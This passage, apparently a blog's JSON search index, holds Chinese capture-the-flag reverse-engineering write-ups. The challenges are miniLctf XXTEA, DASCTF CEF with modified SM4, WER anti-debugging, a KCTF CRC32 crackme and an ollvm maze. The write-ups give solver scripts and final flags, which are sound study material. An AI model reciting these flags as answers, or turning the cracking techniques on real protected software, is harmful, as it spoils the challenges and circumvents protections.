v[0] -= MX; sum -= DELTA; &#125; while (--rounds);&#125;int main()&#123; uint32_t v[5] = &#123;0x6b7ce328,0x4841d5dd,0x963784dc,0xef8a3226,0x776b226&#125;; int n = 5; xxtea(v, n, k); int i; for(i=0;i&lt;5;i++) &#123; printf(&quot;%c&quot;,v[i]&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;8&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;16&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;24&amp;0xff); &#125; return 0;&#125; 后面那半就比较好出了，没有改任何Delta数或XXTEA算法 miniLctf{cbda59ff59e3e90c91c02e9b40b78b} 参考：miniL2022 WP 今晚恰烤lq！ - 云之君 (yunzh1jun.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"TLS回调函数","slug":"TLS回调函数","permalink":"http://example.com/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"},{"name":"反调试","slug":"反调试","permalink":"http://example.com/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"异常处理","slug":"异常处理","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}],"author":"1ens"},{"title":"CEF","slug":"cef","date":"2022-05-26T16:00:00.000Z","updated":"2022-05-27T14:31:42.247Z","comments":true,"path":"2022/05/27/cef/","link":"","permalink":"http://example.com/2022/05/27/cef/","excerpt":"","text":"32位无壳程序 CEF简介: 嵌入式Chromium框架(简称CEF) 是一个由Marshall Greenblatt在2008建立的开源项目，它主要目的是开发一个基于Google Chromium的Webbrowser控件。CEF支持一系列的编程语言和操作系统，并且能很容易地整合到新的或已有的工程中去。 解题：正面去分析的话，十分困难。去搜索相应字符串无果 这里我们可以去从数据调用去分析，我们去分析.data的数据 一组奇怪的数据，猜测加密时用到，交叉引用找到调用的地方 调试验证一下，一开始会停在调用的dll函数里面，我们直接步过，然后输入32位之后就会断下F9提示correct，验证我们的猜想是正确的。调试发现其实，加密整个逻辑就在else里面，一个魔改的SM4，其基本运算为异或^和循环左移&lt;&lt;&lt; round函数 解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned int SK[32] = &#123; 0xE8DB227C, 0x012451B9, 0xED08A9DB, 0xC91F65C3, 0xB3D1E981, 0x319B4734, 0xA4BA5551, 0xD0F2ED2D, 0x4A00D692, 0xE0AEFE30, 0x6BBCDB4A, 0xC315F6F1, 0xB4E1B030, 0x694C4ACE, 0x479208D3, 0x3F8C7B97, 0x747777A6, 0xEDEC9BBB, 0xC8E506C1, 0xB955A92A, 0xB388FDBB, 0x1A4697C3, 0xB10826AA, 0xBB1F2207, 0x291DCD60, 0x2BA3E3A7, 0x1B83DFDD, 0x014D4FD5, 0x80C659F3, 0x3EB45B23, 0x43E36266, 0xBD22532C&#125;;#define GET_ULONG(n, b, i) \\ (n) = ( (unsigned long) (b)[(i + 3)] &lt;&lt; 24 ) \\ | ( (unsigned long) (b)[(i + 2)] &lt;&lt; 16 ) \\ | ( (unsigned long) (b)[(i + 1)] &lt;&lt; 8 ) \\ | ( (unsigned long) (b)[(i )] ); \\#define PUT_ULONG(n, b, i) \\&#123; \\ (b)[(i) + 3] = (unsigned char) ( (n) &gt;&gt; 24 ); \\ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 16 ); \\ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 8 ); \\ (b)[(i) ] = (unsigned char) ( (n) ); \\&#125; #define SHL(x, n) ( ((x) &amp; 0xFFFFFFFF) &lt;&lt; n )#define ROTL(x, n) ( SHL((x), n) | ((x) &gt;&gt; (32 - n)) )#define SWAP(a, b) &#123; unsigned t = a; a = b; b = t; t = 0; &#125; void SM4_Decrypt(unsigned char * input, unsigned char * output, int len); void Round(unsigned char input[16], unsigned char output[16]);int main(void)&#123; unsigned char input[] = &#123; 0x7D, 0x54, 0xCB, 0xC0, 0x74, 0xDB, 0xF5, 0xD7, 0x6F, 0xD9, 0x92, 0x1B, 0xEB, 0x28, 0x46, 0x20, 0xE5, 0xD5, 0xD3, 0x60, 0x80, 0x6D, 0x36, 0x2F, 0xB0, 0x63, 0x2F, 0x61, 0x20, 0x0F, 0xA9, 0x30 &#125;; unsigned char output[32] = &#123; 0 &#125;; int i; SM4_Decrypt(input, output, 32); for ( i = 0; i &lt; 32; i++ ) &#123;// printf(&quot;0x%X, &quot;, output[i]); printf(&quot;%c&quot;, output[i]); &#125; return 0;&#125;void SM4_Decrypt(unsigned char * input, unsigned char * output, int len)&#123; int i; for ( i = 0; i &lt; 16; i++ ) SWAP(SK[i], SK[31 - i]); while ( len &gt; 0 ) &#123; Round(input, output); input += 16; output += 16; len -= 16; &#125;&#125;void Round(unsigned char input[16], unsigned char output[16])&#123; unsigned long tmp[4] = &#123; 0 &#125;; int i; unsigned int t = 0; GET_ULONG(tmp[0], input, 0); GET_ULONG(tmp[1], input, 4); GET_ULONG(tmp[2], input, 8); GET_ULONG(tmp[3], input, 12); for ( i = 0; i &lt; 32; i++ ) &#123; t = SK[i] ^ tmp[(i + 1) % 4] ^ tmp[(i + 2) % 4] ^ tmp[(i + 3) % 4]; tmp[i % 4] ^= t ^ ROTL(t, 2) ^ ROTL(t, 24) ^ ROTL(t, 10) ^ ROTL(t, 18); &#125; for ( i = 0 ; i &lt; 4; i++ ) GET_ULONG(SK[26 - i], input, i * 4); // 正好是把加密后的值放入 那么解密的时候就是把密文放入即可 PUT_ULONG(tmp[3], output, 0); PUT_ULONG(tmp[2], output, 4); PUT_ULONG(tmp[1], output, 8); PUT_ULONG(tmp[0], output, 12);&#125; 运行得到 3b2365b04700b5eac3a5fd0ba21b687f 参考：DASCTF2022 X VOID-CEF - P.Z’s Blog (ppppz.net)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-CEF","slug":"CEF","permalink":"http://example.com/tags/CEF/"}],"author":"1ens"},{"title":"WER","slug":"WER","date":"2022-05-25T16:00:00.000Z","updated":"2022-05-26T14:18:22.094Z","comments":true,"path":"2022/05/26/WER/","link":"","permalink":"http://example.com/2022/05/26/WER/","excerpt":"","text":"无壳，64位 什么是WER：Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 参考：关于 WER - Win32 apps | Microsoft Docs 其关键函数如下： 123DWORD WINAPI ApplicationRecoveryCallback( PVOID pvParameter //上下文信息在调用‎‎注册应用程序恢复回拨‎‎函数以注册恢复时指定。‎); ‎应用程序定义的回调函数，用于在应用程序遇到未处理的异常或无响应时保存数据和应用程序状态信息。 参考：ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs 1234HRESULT WerReportHang( [in] HWND hwndHungApp, //‎处理未响应的窗口。 [in, optional] PCWSTR pwzHungApplicationName //要在挂起的报告 UI 中显示的无响应应用程序的名称。); 返回值‎：‎返回S_OK函数是否能够在失败时启动报告或错误代码。请注意，S_OK并不一定意味着“无响应”报告已成功完成，而只是表示已启动。‎ 参考：WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 主要运行逻辑为： 1.在初始化注册ApplicationRecoveryCallback函数 2.在OnExit调用WerReportHang触发异常 3.运用ApplicationRecoveryCallback进行真正的逻辑处理。 本题OnExit函数就在main函数里面，调用WerReportHang就会关闭调试器，调试不起来 解题： 搜索关键函数，在import表里面找到，放在了一个dll里面 然后交叉引用找到： 这里的sub_14000F3B0就是我们要找的关键函数 也可以通过MessageBox函数来找。 123data = [ 0x05, 0x03, 0x55, 0x05, 0x04, 0x07, 0x5E, 0x54, 0x05, 0x07, 0x50, 0x02, 0x03, 0x53, 0x5F, 0x50, 0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55, 0x57, 0x03, 0x05, 0x02, 0x52, 0x50, 0x51, 0x53]for i in range(len(data)): print(chr(data[i] ^ 102), end = &quot;&quot;) 异或写脚本得到flag","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[wer]","slug":"wer","permalink":"http://example.com/tags/wer/"}],"author":"1ens"},{"title":"末日邀请","slug":"KCTF-末日邀请（加密闯关）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-24T15:49:32.139Z","comments":true,"path":"2022/05/24/KCTF-末日邀请（加密闯关）/","link":"","permalink":"http://example.com/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/","excerpt":"","text":"先是输入flag也就是ID，然后进行check，主要考察算法。 对我们的输入进行一系列异或，最后赋值给v39，注意这里v39类型是char，接着进行sbox数据初始化， 然后进行CRC32验证，这里可以动调取到flag，这里v34的值后面会给出并进行验证。 接着先将字符转成数值，存入内存，并且如果大于58就减去55.接着用冰雹猜想验证输入的前三位。我们可以爆破得到v17的值是定值7.具体前三位先按下不表 爆破代码： 123456789101112131415161718192021222324252627#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;int i; // edxint v13; // ecxint v15; // eaxint j; // edxint v17; // ediint v33[200]; // [esp+10h] [ebp-368h]int main()&#123; for (int i = 0; i &lt;= 0xff; i++) &#123; v13 = i; v15 = v13; for (j = 1; j &lt; 200; ++j) &#123; if ((v15 &amp; 1) != 0) // 奇数*3+1 v15 = 3 * v15 + 1; else v15 &gt;&gt;= 1; // 偶数右移1 v33[j] = v15; &#125; v17 = v33[198] | v33[197] | v33[196]; cout &lt;&lt; v17 &lt;&lt; endl; &#125;&#125; 后面就是判断后四位是否为KCTF 动调发现是v41[1]是输入的第8个字符，推测后面还需要验证九位，然后进行取余验证，依次取最高前i位，看是否能取余i，不能则失败。但是后面对这里有一个约束。先是冒泡排序从小到大排序，然后对比19，也就是必须包含19每个数字 爆破取得这九位：381654729 12345for i in range(100000000,1000000000): if i//10000000 %2 == 0 and i//1000000%3 == 0 and i//100000%4 == 0 and i//10000%5 == 0 and i//1000 %6 == 0 and i//100 % 7 == 0 and i//10 % 8 == 0 and i%9 == 0: num_all = str(i) if &quot;1&quot; in num_all and &quot;2&quot; in num_all and &quot;3&quot; in num_all and &quot;4&quot; in num_all and &quot;5&quot; in num_all and &quot;6&quot; in num_all and &quot;7&quot; in num_all and &quot;8&quot; in num_all and &quot;9&quot; in num_all : print(i) 最后就是判断v34是否相等 也就是前三位 爆破得到前三位：421 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; uint32_t magic_arr[] = &#123;0x00000000, 0x09073096, 0x120E612C, 0x1B0951BA, 0xFF6DC419, 0xF66AF48F, 0xED63A535, 0xE46495A3, 0xFEDB8832, 0xF7DCB8A4, 0xECD5E91E, 0xE5D2D988, 0x01B64C2B, 0x08B17CBD, 0x13B82D07, 0x1ABF1D91, 0xFDB71064, 0xF4B020F2, 0xEFB97148, 0xE6BE41DE, 0x02DAD47D, 0x0BDDE4EB, 0x10D4B551, 0x19D385C7, 0x036C9856, 0x0A6BA8C0, 0x1162F97A, 0x1865C9EC, 0xFC015C4F, 0xF5066CD9, 0xEE0F3D63, 0xE7080DF5, 0xFB6E20C8, 0xF269105E, 0xE96041E4, 0xE0677172, 0x0403E4D1, 0x0D04D447, 0x160D85FD, 0x1F0AB56B, 0x05B5A8FA, 0x0CB2986C, 0x17BBC9D6, 0x1EBCF940, 0xFAD86CE3, 0xF3DF5C75, 0xE8D60DCF, 0xE1D13D59, 0x06D930AC, 0x0FDE003A, 0x14D75180, 0x1DD06116, 0xF9B4F4B5, 0xF0B3C423, 0xEBBA9599, 0xE2BDA50F, 0xF802B89E, 0xF1058808, 0xEA0CD9B2, 0xE30BE924, 0x076F7C87, 0x0E684C11, 0x15611DAB, 0x1C662D3D, 0xF6DC4190, 0xFFDB7106, 0xE4D220BC, 0xEDD5102A, 0x09B18589, 0x00B6B51F, 0x1BBFE4A5, 0x12B8D433, 0x0807C9A2, 0x0100F934, 0x1A09A88E, 0x130E9818, 0xF76A0DBB, 0xFE6D3D2D, 0xE5646C97, 0xEC635C01, 0x0B6B51F4, 0x026C6162, 0x196530D8, 0x1062004E, 0xF40695ED, 0xFD01A57B, 0xE608F4C1, 0xEF0FC457, 0xF5B0D9C6, 0xFCB7E950, 0xE7BEB8EA, 0xEEB9887C, 0x0ADD1DDF, 0x03DA2D49, 0x18D37CF3, 0x11D44C65, 0x0DB26158, 0x04B551CE, 0x1FBC0074, 0x16BB30E2, 0xF2DFA541, 0xFBD895D7, 0xE0D1C46D, 0xE9D6F4FB, 0xF369E96A, 0xFA6ED9FC, 0xE1678846, 0xE860B8D0, 0x0C042D73, 0x05031DE5, 0x1E0A4C5F, 0x170D7CC9, 0xF005713C, 0xF90241AA, 0xE20B1010, 0xEB0C2086, 0x0F68B525, 0x066F85B3, 0x1D66D409, 0x1461E49F, 0x0EDEF90E, 0x07D9C998, 0x1CD09822, 0x15D7A8B4, 0xF1B33D17, 0xF8B40D81, 0xE3BD5C3B, 0xEABA6CAD, 0xEDB88320, 0xE4BFB3B6, 0xFFB6E20C, 0xF6B1D29A, 0x12D54739, 0x1BD277AF, 0x00DB2615, 0x09DC1683, 0x13630B12, 0x1A643B84, 0x016D6A3E, 0x086A5AA8, 0xEC0ECF0B, 0xE509FF9D, 0xFE00AE27, 0xF7079EB1, 0x100F9344, 0x1908A3D2, 0x0201F268, 0x0B06C2FE, 0xEF62575D, 0xE66567CB, 0xFD6C3671, 0xF46B06E7, 0xEED41B76, 0xE7D32BE0, 0xFCDA7A5A, 0xF5DD4ACC, 0x11B9DF6F, 0x18BEEFF9, 0x03B7BE43, 0x0AB08ED5, 0x16D6A3E8, 0x1FD1937E, 0x04D8C2C4, 0x0DDFF252, 0xE9BB67F1, 0xE0BC5767, 0xFBB506DD, 0xF2B2364B, 0xE80D2BDA, 0xE10A1B4C, 0xFA034AF6, 0xF3047A60, 0x1760EFC3, 0x1E67DF55, 0x056E8EEF, 0x0C69BE79, 0xEB61B38C, 0xE266831A, 0xF96FD2A0, 0xF068E236, 0x140C7795, 0x1D0B4703, 0x060216B9, 0x0F05262F, 0x15BA3BBE, 0x1CBD0B28, 0x07B45A92, 0x0EB36A04, 0xEAD7FFA7, 0xE3D0CF31, 0xF8D99E8B, 0xF1DEAE1D, 0x1B64C2B0, 0x1263F226, 0x096AA39C, 0x006D930A, 0xE40906A9, 0xED0E363F, 0xF6076785, 0xFF005713, 0xE5BF4A82, 0xECB87A14, 0xF7B12BAE, 0xFEB61B38, 0x1AD28E9B, 0x13D5BE0D, 0x08DCEFB7, 0x01DBDF21, 0xE6D3D2D4, 0xEFD4E242, 0xF4DDB3F8, 0xFDDA836E, 0x19BE16CD, 0x10B9265B, 0x0BB077E1, 0x02B74777, 0x18085AE6, 0x110F6A70, 0x0A063BCA, 0x03010B5C, 0xE7659EFF, 0xEE62AE69, 0xF56BFFD3, 0xFC6CCF45, 0xE00AE278, 0xE90DD2EE, 0xF2048354, 0xFB03B3C2, 0x1F672661, 0x166016F7, 0x0D69474D, 0x046E77DB, 0x1ED16A4A, 0x17D65ADC, 0x0CDF0B66, 0x05D83BF0, 0xE1BCAE53, 0xE8BB9EC5, 0xF3B2CF7F, 0xFAB5FFE9, 0x1DBDF21C, 0x14BAC28A, 0x0FB39330, 0x06B4A3A6, 0xE2D03605, 0xEBD70693, 0xF0DE5729, 0xF9D967BF, 0xE3667A2E, 0xEA614AB8, 0xF1681B02, 0xF86F2B94, 0x1C0BBE37, 0x150C8EA1, 0x0E05DF1B, 0x0702EF8D&#125;; char cstr[] = &quot;...KCTF381654729&quot;; int main() &#123; for (int i = 0x20; i &lt; 0x7e; i++) &#123; for (int j = 0x20; j &lt; 0x7e; j++) &#123; for (int k = 0x20; k &lt; 0x7e; k++) &#123; cstr[0] = i; cstr[1] = j; cstr[2] = k; int32_t v11 = -1; for (int idx = 0; idx &lt; 16; idx++) &#123; v11 = magic_arr[(uint8_t)(v11 ^ cstr[idx])] ^ (v11 &gt;&gt; 8); &#125; if ((~v11) == 0xF52E0765) &#123; printf(&quot;%c %c %c\\n&quot;, i, j, k); &#125; &#125; &#125; &#125;&#125; 最后的flag:421KCTF381654729","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-加解密","slug":"加解密","permalink":"http://example.com/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"}],"author":"1ens"},{"title":"ezam","slug":"ezam（ollvm 迷宫 进制）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-28T09:03:02.930Z","comments":true,"path":"2022/05/24/ezam（ollvm 迷宫 进制）/","link":"","permalink":"http://example.com/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/","excerpt":"","text":"题目打开 标准的ollvm混肴，用脚本两次去除 得到正常的程序 初步分析是以为多项式相加，疏忽了v17以及前面一大段数据的初始化。想着用z3硬解失败了。主要逻辑为读取输入，判断是否为数字，然后转换成四进制，走迷宫。前面的一大段加密是初始化迷宫地图v17，我们可以动调得到一个16*28的迷宫：（做题多尝试 123456789101112131415161,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,1,1,1,1,1,1,1,1,0,0,0,1,0,0,0,0,0,1,1,0,1,1,0,0,1,0,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,1,1,0,0,1,0,0,1,0,0,0,1,0,0,0,1,1,1,0,0,0,1,0,1,1,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,1,0,0,1,0,1,0,0,0,1,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,1,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0 下面看一下 sub_400670 函数 ，结合动调，是十进制转四进制算法。下面就是迷宫出走方式得到两条路径，根据函数判断路径长度是45，所以是上面那条232222322330030000303322223333333222233333333232222322330030000303322222222222333333300033333333然后四进制转十进制得到flag 1234567891011def anyToDecimal(num,n): baseStr = &#123;&quot;0&quot;:0,&quot;1&quot;:1,&quot;2&quot;:2,&quot;3&quot;:3,&quot;4&quot;:4,&quot;5&quot;:5,&quot;6&quot;:6,&quot;7&quot;:7,&quot;8&quot;:8,&quot;9&quot;:9, &quot;a&quot;:10,&quot;b&quot;:11,&quot;c&quot;:12,&quot;d&quot;:13,&quot;e&quot;:14,&quot;f&quot;:15,&quot;g&quot;:16,&quot;h&quot;:17,&quot;i&quot;:18,&quot;j&quot;:19&#125; new_num = 0 nNum = len(num) - 1 for i in num: new_num = new_num + baseStr[i]*pow(n,nNum) nNum = nNum -1 print(new_num)anyToDecimal(&#x27;232222322330030000303322223333333222233333333&#x27;, 4) flag{902741462666576198076399615}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"迷宫","slug":"迷宫","permalink":"http://example.com/tags/%E8%BF%B7%E5%AE%AB/"},{"name":"进制","slug":"进制","permalink":"http://example.com/tags/%E8%BF%9B%E5%88%B6/"}],"author":"1ens"}],"categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"},{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"},{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"},{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"-[dll]","slug":"dll","permalink":"http://example.com/tags/dll/"},{"name":"-[native] -[android]","slug":"native-android","permalink":"http://example.com/tags/native-android/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"快排","slug":"快排","permalink":"http://example.com/tags/%E5%BF%AB%E6%8E%92/"},{"name":"归并","slug":"归并","permalink":"http://example.com/tags/%E5%BD%92%E5%B9%B6/"},{"name":"二分","slug":"二分","permalink":"http://example.com/tags/%E4%BA%8C%E5%88%86/"},{"name":"差分","slug":"差分","permalink":"http://example.com/tags/%E5%B7%AE%E5%88%86/"},{"name":"入门","slug":"入门","permalink":"http://example.com/tags/%E5%85%A5%E9%97%A8/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"},{"name":"mips","slug":"mips","permalink":"http://example.com/tags/mips/"},{"name":"-[ACTF] -[dropper]","slug":"ACTF-dropper","permalink":"http://example.com/tags/ACTF-dropper/"},{"name":"固件分析","slug":"固件分析","permalink":"http://example.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"},{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"},{"name":"-luajit","slug":"luajit","permalink":"http://example.com/tags/luajit/"},{"name":"TLS回调函数","slug":"TLS回调函数","permalink":"http://example.com/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"},{"name":"反调试","slug":"反调试","permalink":"http://example.com/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"异常处理","slug":"异常处理","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"-CEF","slug":"CEF","permalink":"http://example.com/tags/CEF/"},{"name":"-[wer]","slug":"wer","permalink":"http://example.com/tags/wer/"},{"name":"-加解密","slug":"加解密","permalink":"http://example.com/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"},{"name":"迷宫","slug":"迷宫","permalink":"http://example.com/tags/%E8%BF%B7%E5%AE%AB/"},{"name":"进制","slug":"进制","permalink":"http://example.com/tags/%E8%BF%9B%E5%88%B6/"}]}